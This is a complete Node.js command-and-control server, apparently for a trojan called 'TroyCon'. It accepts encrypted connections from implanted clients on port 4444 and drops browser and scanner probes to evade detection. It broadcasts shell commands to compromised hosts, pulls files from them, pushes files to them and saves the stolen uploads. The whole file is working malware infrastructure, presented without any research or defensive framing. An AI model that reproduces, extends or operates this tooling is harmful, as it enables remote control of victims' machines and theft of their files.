const net = require('net');
const readline = require('readline');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// --- Server Configuration ---
const HOST = '0.0.0.0';
const PORT = 4444;

// --- File Storage Directory Configuration ---
const UPLOAD_DIR = path.join(__dirname, 'client_uploads');

if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
    console.log(`[Config] Directory created successfully: ${UPLOAD_DIR}`);
}

// --- Client Management and Server Logic ---
const clients = new Map();

// --- Encryption and Decryption Functions ---
function encrypt(data, clientKey) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', clientKey, iv);
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return Buffer.concat([iv, encrypted]);
}

function decrypt(data, clientKey) {
    const iv = data.slice(0, 16);
    const ciphertext = data.slice(16);

    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', clientKey, iv);
        let decrypted = decipher.update(ciphertext);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted;
    } catch (e) {
        console.error(`[!] Error occurred during decryption: ${e.message}. (IV: ${iv.toString('hex')}, Ciphertext: ${ciphertext.toString('hex').substring(0, 100)}...)`);
        throw e;
    }
}

function sendPacket(socket, payload, clientKey) {
    try {
        const encryptedPayload = encrypt(payload, clientKey);
        const lengthPrefix = Buffer.alloc(4);
        lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
        socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
    } catch (e) {
        console.error(`[!] Send Error: ${e.message}`);
    }
}

const server = net.createServer(socket => {
    const addr = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New Connection: ${addr} (Starting Key Exchange...)`);
    socket.setTimeout(3000);

    const serverECDH = crypto.createECDH('secp256k1');
    serverECDH.generateKeys();

    clients.set(addr, {
        socket: socket,
        key: null,
        ecdh: serverECDH,
        state: 'HANDSHAKE',
        buffer: Buffer.alloc(0),
        expectedLength: 0,
        fileState: null
    });

    const serverPublicKey = serverECDH.getPublicKey();
    const pubKeyLen = Buffer.alloc(4);
    pubKeyLen.writeUInt32BE(serverPublicKey.length, 0);
    socket.write(Buffer.concat([pubKeyLen, serverPublicKey]));

    socket.on('data', data => {
        const headerPeek = data.subarray(0, 4).toString('utf8');

        if (['GET ', 'POST', 'HEAD', 'PUT '].includes(headerPeek)) {
            console.log(`[!] Browser/Scanner detected from ${addr}. Dropping connection.`);
            socket.end();
            return;
        }

        const clientObj = clients.get(addr);
        if (!clientObj) return;

        clientObj.buffer = Buffer.concat([clientObj.buffer, data]);

        while (true) {
            // 1. Read message length prefix
            if (clientObj.expectedLength === 0) {
                if (clientObj.buffer.length >= 4) {
                    clientObj.expectedLength = clientObj.buffer.readUInt32BE(0);
                    clientObj.buffer = clientObj.buffer.subarray(4);
                } else {
                    break; // Incomplete length prefix
                }
            }

            // 2. Read actual message body
            if (clientObj.buffer.length >= clientObj.expectedLength) {
                const packetBody = clientObj.buffer.slice(0, clientObj.expectedLength);
                clientObj.buffer = clientObj.buffer.slice(clientObj.expectedLength);
                clientObj.expectedLength = 0; // Reset length for the next message

                if (clientObj.state === 'HANDSHAKE') {
                    try {
                        const clientPublicKey = packetBody;
                        const sharedSecret = clientObj.ecdh.computeSecret(clientPublicKey);
                        const derivedKey = crypto.createHash('sha256').update(sharedSecret).digest();

                        clientObj.key = derivedKey;
                        clientObj.state = 'ESTABLISHED';
                        socket.setTimeout(0);
                        delete clientObj.ecdh;

                        console.log(`[+] Key Exchange Complete with ${addr}. Secure Channel Established.`);
                    } catch (e) {
                        console.error(`[!] Handshake Failed with ${addr}: ${e.message}`);
                        socket.end();
                    }
                } else if (clientObj.state === 'ESTABLISHED') {
                    try {
                        const decryptedData = decrypt(packetBody, clientObj.key);
                        if (!decryptedData) return console.error(`[!] Decryption Failed from ${addr}`);
                        let dataStrPeek = "";
                        try {
                            dataStrPeek = decryptedData.toString('utf8', 0, Math.min(decryptedData.length, 100));
                        } catch (strErr) {
                            console.error(`(Server): [${addr}] UTF-8 conversion error: ${strErr.message}`);
                        }
                        console.log(`(Server): [${addr}] Decrypted data (total length): ${decryptedData.length} bytes`);


                        // --- Process file content if currently in file reception state (Phase 2) ---
                        if (clientObj.fileState) {
                            let fileState = clientObj.fileState;
                            // decryptedData contains the actual file content, so we use it directly.
                            // Since fileState.receivedBytes was previously initialized with Buffer.alloc(0),
                            // the first file content message will fill receivedBytes.
                            fileState.receivedBytes = Buffer.concat([fileState.receivedBytes, decryptedData]);

                            console.log(`[${addr}] Receiving file data: ${fileState.receivedBytes.length}/${fileState.expectedLength} bytes (based on original file size)`);

                            if (fileState.receivedBytes.length >= fileState.expectedLength) {
                                // At this point, fileState.receivedBytes length should exactly match fileState.expectedLength.
                                // If it exceeds, the extra data is trimmed.
                                const fileContent = fileState.receivedBytes.slice(0, fileState.expectedLength);
                                const filename = fileState.filename;
                                const savePath = path.join(UPLOAD_DIR, `${addr.replace(/:/g, '_')}_${filename}`);

                                fs.writeFile(savePath, fileContent, err => {
                                    if (err) {
                                        console.error(`[!] ${addr} File save error (${filename}): ${err.message}`);
                                        sendResponse(socket, `SERVER_RESPONSE:UPLOAD_ERROR:${err.message}`);
                                    } else {
                                        console.log(`[${addr}] File '${filename}' received and saved successfully: ${savePath} (${fileContent.length} B)`);
                                        sendResponse(socket, `SERVER_RESPONSE:UPLOAD_SUCCESS:${filename}`, clientObj.key);
                                    }
                                    clientObj.fileState = null; // Reset file transfer state
                                });
                            }
                        } else {
                            // --- Process general commands or file headers (Phase 1) ---
                            if (dataStrPeek.startsWith('FILE_UPLOAD_HEADER:')) {
                                const fullHeaderStr = decryptedData.toString('utf8');
                                console.log(`(Server): [${addr}] Full received header string: '${fullHeaderStr}'`);

                                const parts = fullHeaderStr.split(':', 3);

                                if (parts.length < 3) {
                                    console.error(`[!] ${addr} Header parsing error: Expected format 'FILE_UPLOAD_HEADER:path:length' not met. Received parts:`, parts);
                                    return;
                                }

                                const base64EncodedPath = parts[1];
                                try {
                                    const originalPathBuffer = Buffer.from(base64EncodedPath, 'base64');
                                    const originalPath = originalPathBuffer.toString('utf8');

                                    const fileLength = parseInt(parts[2], 10);
                                    const filename = path.basename(originalPath);


                                    if (isNaN(fileLength)) {
                                        console.error(`[!] ${addr} File length parsing error: '${parts[2]}' is not a valid number.`);
                                        return;
                                    }

                                    clientObj.fileState = {
                                        filename: filename,
                                        expectedLength: fileLength,
                                        receivedBytes: Buffer.alloc(0)
                                    };
                                    console.log(`[${addr}] File upload header received: '${filename}', expected original size: ${fileLength} bytes. Waiting for file content...`);
                                } catch (e) {
                                    console.error(`[!] ${addr} Base64 decoding error or UTF-8 conversion error: ${e.message}`);
                                    return;
                                }
                            } else if (dataStrPeek.startsWith('CHECK_IN:')) {
                                const clientInfo = decryptedData.toString('utf8').substring('CHECK_IN:'.length);
                                console.log(`[${addr}] Client check-in: ${clientInfo}`);
                            } else {
                                console.log(`[${addr}] Command execution result:\n${decryptedData.toString('utf8')}`);
                            }
                        }
                    } catch (e) {
                        console.error(`[!] ${addr} Data decryption or processing error: ${e.message}. Problematic message (HEX, first 100 chars): ${packetBody.toString('hex').substring(0, 100)}...`);
                        clients.expectedLength = 0; // Reset length to prepare for the next message in case of an error
                    }
                }
            } else {
                break;
            }
        }
    });

    socket.on('close', () => {
        console.log(`[-] Client disconnected: ${addr}`);
        clients.delete(addr);
    });

    socket.on('timeout', () => {
        console.log(`[-] Timeout (Zombie killed): ${addr}`);
        socket.destroy();
    });

    socket.on('error', err => {
        console.log(`[!] Error occurred: ${addr} - ${err.message}`);
    });
});

// Helper function to send encrypted responses with length prefix
function sendResponse(socket, message, clientKey) {
    const encryptedPayload = encrypt(Buffer.from(message, 'utf8'), clientKey);
    const lengthPrefix = Buffer.alloc(4);
    lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
    socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
}


server.listen(PORT, HOST, () => {
    console.log(`Server running at: ${HOST}:${PORT}`);
    console.log(`C2 server awaiting encryption/decryption with client's AES key...`);
    console.log(`File upload save directory: ${UPLOAD_DIR}`);
});

// --- Create interface for terminal input (command control) ---
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'TroyCon_C2> '
});

rl.prompt();

rl.on('line', async line => {
    const parts = line.trim().split(' ');

    if (parts.length < 2) {
        console.log('Usage: <IP:Port|all> <command>');
        console.log('Currently connected clients:', Array.from(clients.keys()));
        rl.prompt();
        return;
    }

    const target = parts[0];
    const commandType = parts[1] ? parts[1].toUpperCase() : '';
    const cmdArgs = parts.slice(2).join(' ');

    let payloadToSend;

    if (commandType === 'GET_FILE') {
        const filePathOnClient = cmdArgs;
        if (!filePathOnClient) {
            console.log('The GET_FILE command requires specifying the file path within the client. Example: [client_address] GET_FILE /path/to/file.txt');
            rl.prompt();
            return;
        }
        payloadToSend = Buffer.from(`GET_FILE:${filePathOnClient}`, 'utf8');
        console.log(`Sending file request command to [${target}]: '${filePathOnClient}'`);
    } else if (commandType === 'PUT_FILE') {
        const localFilePath = parts[2];
        const remoteFilePath = parts[3] || path.basename(localFilePath);

        if (!fs.existsSync(localFilePath) || !fs.statSync(localFilePath).isFile()) {
            console.log(`[!] Local file '${localFilePath}' not found or is not a file.`);
            rl.prompt();
            return;
        }

        try {
            const fileContent = fs.readFileSync(localFilePath);
            const actualRemotePathForClient = remoteFilePath || path.basename(localFilePath);
            const encodedRemotePath = Buffer.from(actualRemotePathForClient, 'utf8').toString('base64');

            payloadToSend = Buffer.concat([
                Buffer.from(`PUT_FILE:${encodedRemotePath}:${fileContent.length}:`, 'utf8'),
                fileContent
            ]);
            console.log(`Sending file transfer command to [${target}]: '${localFilePath}' -> '${remoteFilePath}' (${fileContent.length} B)`);
        } catch (e) {
            console.error(`[!] Local file read error: ${e.message}`);
            rl.prompt();
            return;
        }
    } else {
        const commandText = `${commandType} ${cmdArgs}`.trim();
        if (!commandText) {
            console.log('Invalid command format. Example: [client_address] command');
            rl.prompt();
            return;
        }
        payloadToSend = Buffer.from(commandText, 'utf8');
        console.log(`Sending general command to [${target}]: "${commandText}"`);
    }

    if (target.toUpperCase() === 'ALL') {
        if (clients.size === 0) console.log("[!] No clients.");
        else {
            let count = 0;
            for (const clientObj of clients.values()) {
                if (clientObj.state === 'ESTABLISHED') {
                    sendPacket(clientObj.socket, payloadToSend, clientObj.key);
                    count++;
                }
            }
            console.log(`[+] Broadcasted to ${count} clients.`);
        }
    } else {
        const socket = clients.get(target);
        if (!socket) {
            console.log(`[!] Client '${target}' not found. Available: ${Array.from(clients.keys())}`);
        } else if (socket.state !== 'ESTABLISHED') {
            console.log(`[!] Client is performing handshake. Wait.`);
        } else {
            sendPacket(socket.socket, payloadToSend, socket.key);
            console.log(`[+] Sent to ${target}`);
        }
    }

    rl.prompt();
});